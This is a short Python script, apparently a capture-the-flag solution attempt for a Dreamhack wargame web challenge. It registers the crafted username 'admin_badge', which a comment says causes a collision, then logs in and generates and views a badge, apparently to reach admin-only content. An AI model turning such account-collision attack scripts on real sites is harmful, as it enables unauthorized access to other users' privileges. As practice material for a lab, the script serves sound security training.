import requests

url = "http://host3.dreamhack.games:20999"  # Replace with actual URL
session = requests.Session()

# Try to register with a crafted username
register_data = {
    'username': 'admin_badge',  # This username will cause a collision
    'password': 'test123'
}

# Register
resp = session.post(f"{url}/register.php", data=register_data)
print("Register response:", resp.text)

# Login
login_data = {
    'username': 'admin_badge',
    'password': 'test123'
}
resp = session.post(f"{url}/login.php", data=login_data)
print("Login response:", resp.text)

# Generate badge
generate_data = {
    'password': 'test123'
}
resp = session.post(f"{url}/generate_badge.php", data=generate_data)
print("Generate badge response:", resp.text)

# View badge
resp = session.get(f"{url}/view_badge.php")
print("View badge response:", resp.text)